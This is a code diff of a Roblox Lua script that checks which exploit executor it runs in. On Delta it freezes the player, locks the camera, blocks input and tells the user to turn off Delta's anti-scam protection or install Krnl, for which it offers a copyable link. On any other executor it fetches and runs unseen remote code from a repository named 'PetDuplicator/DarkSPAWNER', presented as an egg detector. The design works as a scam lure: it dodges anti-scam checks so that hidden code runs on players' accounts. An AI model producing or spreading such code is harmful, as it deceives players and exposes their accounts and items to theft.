@@ -1,14 +1,4 @@
---[[
-    Delta Executor Detection + Freeze Lock by Nelli (Recreated in Lua for Roblox)
-
-    This script aims to replicate the functionality and visual style of the
-    HTML UI for a Roblox environment. It detects if the script is running
-    on a "Delta" executor, and if so, applies a freeze effect and displays
-    a custom UI with a message and a copy button.
-
-    Note: This is a client-side script (LocalScript) and should be placed
-    in StarterPlayerScripts or PlayerGui.
-]]
+-- 🔍 Delta Executor Detection + Freeze Lock by Nelli
 
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
@@ -16,185 +6,177 @@ local UserInputService = game:GetService("UserInputService")
 local StarterGui = game:GetService("StarterGui")
 local player = Players.LocalPlayer
 local camera = workspace.CurrentCamera
-local playerGui = player:WaitForChild("PlayerGui")
+local gui = player:WaitForChild("PlayerGui")
 
--- Function to detect executor (based on original user-provided logic)
+-- Function to detect executor
 local function getExecutorName()
-    -- Debugging: Print which detection function is being checked
-    if identifyexecutor then
-        print("Executor detection: identifyexecutor found.")
-        return identifyexecutor()
-    elseif getexecutorname then
-        print("Executor detection: getexecutorname found.")
-        return getexecutorname()
-    elseif isdelta then
-        print("Executor detection: isdelta found.")
-        return "Delta"
-    elseif iskrnlclosure then
-        print("Executor detection: iskrnlclosure found.")
-        return "Krnl"
-    elseif syn then
-        print("Executor detection: syn found.")
-        return "Synapse X"
-    elseif is_sirhurt_closure then
-        print("Executor detection: is_sirhurt_closure found.")
-        return "SirHurt"
-    elseif pebc_execute then
-        print("Executor detection: pebc_execute found.")
-        return "ProtoSmasher"
-    elseif isfluxus then
-        print("Executor detection: isfluxus found.")
-        return "Fluxus"
-    else
-        print("Executor detection: No known executor detected.")
-        return "Unknown"
-    end
+	if identifyexecutor then
+		return identifyexecutor()
+	elseif getexecutorname then
+		return getexecutorname()
+	elseif isdelta then
+		return "Delta"
+	elseif iskrnlclosure then
+		return "Krnl"
+	elseif syn then
+		return "Synapse X"
+	elseif is_sirhurt_closure then
+		return "SirHurt"
+	elseif pebc_execute then
+		return "ProtoSmasher"
+	elseif isfluxus then
+		return "Fluxus"
+	else
+		return "Unknown"
+	end
 end
 
 local executor = getExecutorName()
-warn("Executor Detected:", executor) -- Output to Roblox console
+warn("Executor Detected:", executor)
 
 -- If executor is Delta, activate the freeze screen
 if executor:lower():find("delta") then
-    print("Delta executor detected. Activating freeze screen.")
-    -- Wait for character to load
-    local character = player.Character or player.CharacterAdded:Wait()
-    local humanoid = character:WaitForChild("Humanoid")
-    local rootPart = character:WaitForChild("HumanoidRootPart")
+	-- Wait for character
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoid = character:WaitForChild("Humanoid")
+	local rootPart = character:WaitForChild("HumanoidRootPart")
 
-    -- 🌀 Blur screen (similar to HTML background blur)
-    local blur = Instance.new("BlurEffect")
-    blur.Name = "DeltaFreezeBlur"
-    blur.Size = 25 -- Adjust blur intensity as needed
-    blur.Parent = Lighting
-    print("Blur effect applied.")
+	-- 🌀 Blur screen
+	local blur = Instance.new("BlurEffect")
+	blur.Name = "DeltaFreezeBlur"
+	blur.Size = 25
+	blur.Parent = Lighting
 
-    -- 🧊 Freeze player
-    humanoid.WalkSpeed = 0
-    humanoid.JumpPower = 0
-    humanoid.AutoRotate = false
-    rootPart.Anchored = true
-    print("Player frozen.")
+	-- 🧊 Freeze player
+	humanoid.WalkSpeed = 0
+	humanoid.JumpPower = 0
+	humanoid.AutoRotate = false
+	rootPart.Anchored = true
 
-    -- 🎥 Lock camera
-    -- Ensure the camera exists and is ready
-    if not camera then
-        camera = workspace:WaitForChild("CurrentCamera")
-    end
-    camera.CameraType = Enum.CameraType.Scriptable
-    -- Position camera relative to the player's root part
-    camera.CFrame = CFrame.new(rootPart.Position + Vector3.new(0, 6, 12), rootPart.Position)
-    print("Camera locked.")
+	-- 🎥 Lock camera
+	camera.CameraType = Enum.CameraType.Scriptable
+	camera.CFrame = CFrame.new(rootPart.Position + Vector3.new(0, 6, 12), rootPart.Position)
 
-    -- Create UI (mimicking the HTML modal's appearance)
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "DeltaDetectionUI"
-    screenGui.IgnoreGuiInset = true
-    screenGui.ResetOnSpawn = false -- Keep UI after player respawns
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    screenGui.Parent = playerGui
-    print("ScreenGui created and parented.")
+	-- Create UI to match the image
+	local screenGui = Instance.new("ScreenGui")
+	screenGui.IgnoreGuiInset = true
+	screenGui.ResetOnSpawn = false
+	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	screenGui.Parent = player:WaitForChild("PlayerGui")
 
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(0, 400, 0, 200) -- Fixed size like in HTML
-    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 36) -- Dark gray/black from green.png
-    mainFrame.BorderSizePixel = 0
-    mainFrame.Parent = screenGui
-    print("Main frame created.")
+	local mainFrame = Instance.new("Frame")
+	mainFrame.Size = UDim2.new(0, 500, 0, 300) -- Adjusted size to fit content
+	mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+	mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+	mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark background
+	mainFrame.BorderSizePixel = 0
+	mainFrame.Parent = screenGui
 
-    local uiCorner = Instance.new("UICorner")
-    uiCorner.CornerRadius = UDim.new(0, 10) -- Rounded corners
-    uiCorner.Parent = mainFrame
+	local uiCorner = Instance.new("UICorner", mainFrame)
+	uiCorner.CornerRadius = UDim.new(0, 10)
 
-    local title = Instance.new("TextLabel")
-    title.Text = "⚠️ Executor Not Supported" -- Reverted to "Executor Not Supported" from green.png
-    title.Font = Enum.Font.GothamBold -- Using GothamBold for emphasis
-    title.TextSize = 20 -- Reverted size
-    title.TextColor3 = Color3.fromRGB(0, 255, 0) -- Bright green from green.png
-    title.BackgroundTransparency = 1
-    title.Size = UDim2.new(1, -40, 0, 30)
-    title.Position = UDim2.new(0, 20, 0, 10)
-    title.TextWrapped = true
-    title.TextXAlignment = Enum.TextXAlignment.Center
-    title.TextYAlignment = Enum.TextYAlignment.Center
-    title.Parent = mainFrame
-    print("Title label created.")
+	local title = Instance.new("TextLabel")
+	title.Text = "⚠️ Executor Not Supported" -- Warning icon and text
+	title.Font = Enum.Font.GothamBold -- Bold font for title
+	title.TextSize = 24 -- Larger text size
+	title.TextColor3 = Color3.fromRGB(0, 255, 0) -- Green text
+	title.BackgroundTransparency = 1
+	title.Size = UDim2.new(1, -40, 0, 50)
+	title.Position = UDim2.new(0, 20, 0, 20)
+	title.TextWrapped = true
+	title.TextXAlignment = Enum.TextXAlignment.Center
+	title.TextYAlignment = Enum.TextYAlignment.Center
+	title.Parent = mainFrame
 
-    local messageText = Instance.new("TextLabel")
-    -- Reverted text content to match green.png, including "Closing in 59 seconds..."
-    messageText.Text = "You're using an unsupported executor (Delta).\n\nTo fix:\n- Turn off anti-scam in Delta\n- Or use Krnl executor.\n\nClosing in 59 seconds..."
-    messageText.Font = Enum.Font.Gotham
-    messageText.TextSize = 12
-    messageText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White from green.png
-    messageText.BackgroundTransparency = 1
-    messageText.Size = UDim2.new(1, -40, 0, 100)
-    messageText.Position = UDim2.new(0, 20, 0, 40)
-    messageText.TextWrapped = true
-    messageText.TextXAlignment = Enum.TextXAlignment.Center
-    messageText.TextYAlignment = Enum.TextYAlignment.Top
-    messageText.Parent = mainFrame
-    print("Message label created.")
+	local subtitle = Instance.new("TextLabel")
+	subtitle.Text = "You're using an unsupported executor (Delta)."
+	subtitle.Font = Enum.Font.Gotham
+	subtitle.TextSize = 18
+	subtitle.TextColor3 = Color3.fromRGB(200, 200, 200) -- Lighter gray for subtitle
+	subtitle.BackgroundTransparency = 1
+	subtitle.Size = UDim2.new(1, -40, 0, 30)
+	subtitle.Position = UDim2.new(0, 20, 0, 70) -- Position below title
+	subtitle.TextWrapped = true
+	subtitle.TextXAlignment = Enum.TextXAlignment.Center
+	subtitle.TextYAlignment = Enum.TextYAlignment.Center
+	subtitle.Parent = mainFrame
 
-    -- Copy Button
-    local copyButton = Instance.new("TextButton")
-    copyButton.Size = UDim2.new(0, 200, 0, 36)
-    copyButton.Position = UDim2.new(0.5, -100, 1, -50)
-    copyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- Green from green.png
-    copyButton.Text = "Copy Krnl Link"
-    copyButton.Font = Enum.Font.GothamBold -- Using GothamBold for button
-    copyButton.TextSize = 16
-    copyButton.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black text for contrast
-    copyButton.AutoButtonColor = true
-    copyButton.Parent = mainFrame
-    print("Copy button created.")
+	local fixText = Instance.new("TextLabel")
+	fixText.Text = "To fix:\n- Turn off anti-scam in Delta\n- Or use Krnl executor."
+	fixText.Font = Enum.Font.Gotham
+	fixText.TextSize = 16
+	fixText.TextColor3 = Color3.fromRGB(200, 200, 200)
+	fixText.BackgroundTransparency = 1
+	fixText.Size = UDim2.new(1, -40, 0, 80)
+	fixText.Position = UDim2.new(0, 20, 0, 110) -- Position below subtitle
+	fixText.TextWrapped = true
+	fixText.TextXAlignment = Enum.TextXAlignment.Center
+	fixText.TextYAlignment = Enum.TextYAlignment.Center
+	fixText.Parent = mainFrame
 
-    local buttonCorner = Instance.new("UICorner")
-    buttonCorner.CornerRadius = UDim.new(0, 6)
-    buttonCorner.Parent = copyButton
+	local closingText = Instance.new("TextLabel")
+	closingText.Name = "ClosingTimerText"
+	closingText.Text = "Closing in 59 seconds..." -- Initial text, will be updated
+	closingText.Font = Enum.Font.GothamBold
+	closingText.TextSize = 18
+	closingText.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red text
+	closingText.BackgroundTransparency = 1
+	closingText.Size = UDim2.new(1, -40, 0, 30)
+	closingText.Position = UDim2.new(0, 20, 0, 200) -- Position below fix text
+	closingText.TextWrapped = true
+	closingText.TextXAlignment = Enum.TextXAlignment.Center
+	closingText.TextYAlignment = Enum.TextYAlignment.Center
+	closingText.Parent = mainFrame
 
-    -- Copy functionality (using setclipboard for Roblox)
-    copyButton.MouseButton1Click:Connect(function()
-        local success, err = pcall(function()
-            setclipboard("https://krnl.cat/downloads/")
-        end)
-        if success then
-            copyButton.Text = "Copied!"
-            print("Krnl link copied to clipboard.")
-        else
-            copyButton.Text = "Copy Failed!"
-            warn("Failed to copy Krnl link:", err)
-        end
-        task.wait(1)
-        copyButton.Text = "Copy Krnl Link"
-    end)
+	-- Timer for closing text
+	local countdown = 59
+	local function updateCountdown()
+		while countdown >= 0 do
+			closingText.Text = "Closing in " .. countdown .. " seconds..."
+			task.wait(1)
+			countdown = countdown - 1
+		end
+		-- Optionally, close the game or perform another action after countdown
+		-- game:Shutdown() -- Uncomment if you want to shut down the game after countdown
+	end
+	task.spawn(updateCountdown)
 
-    -- 🔧 Hide TopBar (ESC/menu)
-    local success_topbar, err_topbar = pcall(function()
-        StarterGui:SetCore("TopbarEnabled", false)
-    end)
-    if not success_topbar then
-        warn("Failed to hide TopBar:", err_topbar)
-    end
 
-    -- ⛔ Block input backup
-    UserInputService.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.Keyboard or input.UserInputType == Enum.UserInputType.Gamepad1 then
-            input:CaptureController()
-        end
-    end)
-    print("Input blocking enabled.")
+	-- Copy Button
+	local copyButton = Instance.new("TextButton")
+	copyButton.Size = UDim2.new(0, 200, 0, 40) -- Adjusted size
+	copyButton.Position = UDim2.new(0.5, -100, 0, 250) -- Positioned towards the bottom center
+	copyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- Green background
+	copyButton.Text = "Copy Krnl Link"
+	copyButton.Font = Enum.Font.GothamBold -- Bold font for button
+	copyButton.TextSize = 18 -- Larger text size
+	copyButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+	copyButton.AutoButtonColor = true
+	copyButton.Parent = mainFrame
+
+	local buttonCorner = Instance.new("UICorner", copyButton)
+	buttonCorner.CornerRadius = UDim.new(0, 6)
+
+	copyButton.MouseButton1Click:Connect(function()
+		setclipboard("https://krnl.cat/downloads/")
+		copyButton.Text = "Copied!"
+		task.wait(1)
+		copyButton.Text = "Copy Krnl Link"
+	end)
+
+
+	-- 🔧 Hide TopBar (ESC/menu)
+	pcall(function()
+		StarterGui:SetCore("TopbarEnabled", false)
+	end)
+
+	-- ⛔ Block input backup
+	UserInputService.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.Keyboard or input.UserInputType == Enum.UserInputType.Gamepad1 then
+			input:CaptureController()
+		end
+	end)
 else
-    print("Non-Delta executor detected. Attempting to load DarkSPAWNER script.")
-    -- ✅ Not Delta → continue loading Egg Detector script (from original user-provided logic)
-    -- Corrected syntax: removed extra 'end)' at the end of the loadstring pcall
-    local success_loadstring, err_loadstring = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGarden-updated/PetDuplicator/refs/heads/main/DarkSPAWNER"))()
-    end)
-    if success_loadstring then
-        print("DarkSPAWNER script loaded successfully.")
-    else
-        warn("Failed to load DarkSPAWNER script:", err_loadstring)
-    end
+	-- ✅ Not Delta → continue loading Egg Detector script
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGarden-updated/PetDuplicator/refs/heads/main/DarkSPAWNER"))()
 end
